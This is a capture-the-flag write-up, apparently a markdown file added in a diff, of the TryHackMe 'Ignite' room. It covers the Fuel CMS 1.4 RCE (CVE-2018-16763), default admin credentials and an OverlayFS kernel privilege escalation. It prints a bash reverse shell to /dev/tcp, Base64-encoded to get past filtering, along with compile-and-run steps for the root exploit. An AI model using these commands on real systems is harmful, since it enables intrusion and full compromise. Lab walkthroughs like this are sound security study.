@@ -1,0 +1,94 @@
+Ignite (TryHackMe) - Writeup
+Platform: TryHackMe Room: Ignite Difficulty: Easy Objective: Root the machine by exploiting a vulnerable Fuel CMS instance and performing kernel-level privilege escalation.
+
+1. Reconnaissance
+Nmap Scan
+I started with a standard Nmap scan to identify open ports and services.
+
+Bash
+nmap -sC -sV <TARGET_IP>
+Results:
+
+Port 80 (HTTP): Apache/2.4.18 (Ubuntu) running a web server.
+
+Web Enumeration
+Visiting the IP address in the browser revealed the default landing page for Fuel CMS.
+
+Version Discovery: The homepage explicitly displayed the version as Fuel CMS 1.4.
+
+Creds Check: I navigated to the login portal and confirmed that default credentials (admin / admin) allowed access to the dashboard. However, I focused on exploiting the application itself for a shell.
+
+2. Initial Access (Exploitation)
+Vulnerability Identification
+Based on the version information (Fuel CMS 1.4), I searched Exploit-DB and identified CVE-2018-16763.
+
+This version contains a Remote Code Execution (RCE) vulnerability due to improper validation of a specific parameter in the URL (/fuel/pages/select/?filter=). This allows an attacker to inject and execute system commands directly via HTTP requests.
+
+Exploitation
+I downloaded the exploit script for CVE-2018-16763.
+
+Modification: The raw exploit output was cluttered (mixing system warnings with command output), so I modified the script to clean up the response and ensure commands were executing clearly.
+
+Execution: By manipulating the vulnerable parameter, I confirmed I could execute system commands on the target.
+
+Gaining a Reverse Shell
+I attempted to establish a reverse shell using standard one-liners (Bash, Python, Perl), but the connection failed to stabilize.
+
+Solution: I used Base64 encoding to bypass potential character filtering or WAF issues.
+
+Generated a standard bash reverse shell command.
+
+Encoded it in Base64.
+
+Sent the payload via the RCE exploit parameter to decode and execute on the target:
+
+Bash
+echo "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1" | base64
+# Payload sent to server via vulnerable parameter:
+echo <BASE64_STRING> | base64 -d | bash
+Result: Successfully caught a reverse interactive shell as the www-data user.
+
+User Flag: Found in /home/www-data/flag.txt.
+
+3. Privilege Escalation
+Enumeration
+Once inside, I began enumerating the system to find a path to root.
+
+1. Manual Checks (Failed):
+
+sudo -l: The user had no sudo permissions.
+
+SUID Bits: Ran find / -perm -u=s -type f 2>/dev/null but found no unusual binaries.
+
+Capabilities: Checked for risky capabilities, but nothing stood out.
+
+2. Automated Tools:
+
+LinPEAS: I ran the linpeas.sh script, but it did not highlight a clear privilege escalation vector.
+
+Linux Exploit Suggester: I ran this tool as well, but the results were inconclusive ("kuch khas nhi mila").
+
+Kernel Exploitation (The Breakthrough)
+Since manual methods and automated tools didn't provide a direct path, I checked the OS and Kernel version manually:
+
+Bash
+uname -a
+# Result: Linux ubuntu 4.15.0-20-generic ... x86_64
+A search for vulnerabilities affecting this specific Ubuntu kernel version revealed CVE-2021-3493 (OverlayFS Local Privilege Escalation).
+
+Exploitation Steps:
+
+Transfer: I downloaded the exploit code (often exploit.c) to my attacker machine and transferred it to the target using a Python HTTP server.
+
+Compile: I compiled the exploit on the target machine using gcc:
+
+Bash
+gcc exploit.c -o exploit
+Execute: I granted execution permissions and ran the binary:
+
+Bash
+chmod +x exploit
+./exploit
+Root Access: The exploit successfully manipulated the OverlayFS namespace and spawned a root shell (#).
+
+Root Flag: Found in /root/root.txt.
